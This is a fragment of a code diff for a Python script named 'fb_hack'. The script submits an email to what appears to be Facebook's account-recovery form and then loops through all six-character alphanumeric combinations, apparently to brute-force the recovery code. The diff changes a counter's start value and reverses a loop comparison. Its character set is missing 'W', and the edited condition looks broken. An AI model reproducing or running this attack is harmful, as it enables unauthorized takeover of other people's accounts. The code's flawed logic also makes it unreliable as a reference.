@@ -53,14 +53,14 @@ def fb_hack(email, codex):
   browser.select_form(nr=0)
   browser.form['email'] = email 
   browser.submit()
-  counter = 1
+  counter = 0
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
   check1 = soup.find(string="Try another way")
   check2 = soup.find(string="Try another way")
   browser.select_form(nr=0)
   for combination in  itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
-    if counter <= codex:
+    if codex < counter:
       x = (''.join(map(str, combination)))
       codex += 1
     else:
